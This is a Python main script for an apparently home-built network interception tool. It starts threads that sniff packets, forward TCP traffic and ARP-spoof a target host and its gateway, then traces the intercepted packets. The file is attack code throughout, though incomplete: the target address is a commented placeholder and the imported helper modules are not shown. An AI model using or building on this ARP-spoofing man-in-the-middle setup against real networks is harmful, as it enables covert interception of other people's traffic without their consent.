import TcpRelkay
import loguru
import MsgShare
import xTrace
import ArpSpoof
import threading
import socket

loguru.logger.add("log/main.log", rotation="1MB", retention="10 days", level="INFO")
loguru.logger.add("log/main_error.log", rotation="1MB", retention="10 days", level="ERROR")

address = ''
port = 11234

def server():
    # init the channel
    global address
    global port
    server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((xTrace.Sniffer.get_local_ip(),port))
    server.listen(5)
    while True:
        client,addr=server.accept()
        loguru.logger.info(f'get connection from {addr}')


def main():
    # init the channel
    channel = MsgShare.Channel()

    # init the sniffer
    sniffer=xTrace.Sniffer(xTrace.Sniffer.get_local_ip(),11234,channel)
    thread_sniffer = threading.Thread(target=sniffer.sniff,args=(xTrace.Sniffer.get_local_ip(),11234,channel))
    thread_sniffer.start()

    # init the tcp forwarding
    tcp_forwarding = TcpRelkay.TCPForwarding(channel)
    thread_tcp_forwarding = threading.Thread(target=tcp_forwarding.forwarding)
    thread_tcp_forwarding.start()

    # init the arp spoof
    # get the target ip and mac 
    pkg_for_arp = channel.top() # this pkg is from gateway of finding the target mac
    # !!input the target ip and mac, forexample: tfp...
    # target_ip, target_mac = #!!input the target ip and mac
    gateway_ip, gateway_mac = xTrace.Sniffer.get_five_tuple(pkg_for_arp)[1], xTrace.Sniffer.get_mac(pkg_for_arp)
    arp_spoof = ArpSpoof.ArpSpoof(target_ip,target_mac,gateway_ip,gateway_mac)
    thread_arp_spoof = threading.Thread(target=arp_spoof.spoof)
    thread_arp_spoof.start()

    # tarcert
    while True:
        if channel.empty():
            continue
        pkg = channel.top()
        xTrace.Sniffer.tracert(pkg)
        

    


    
    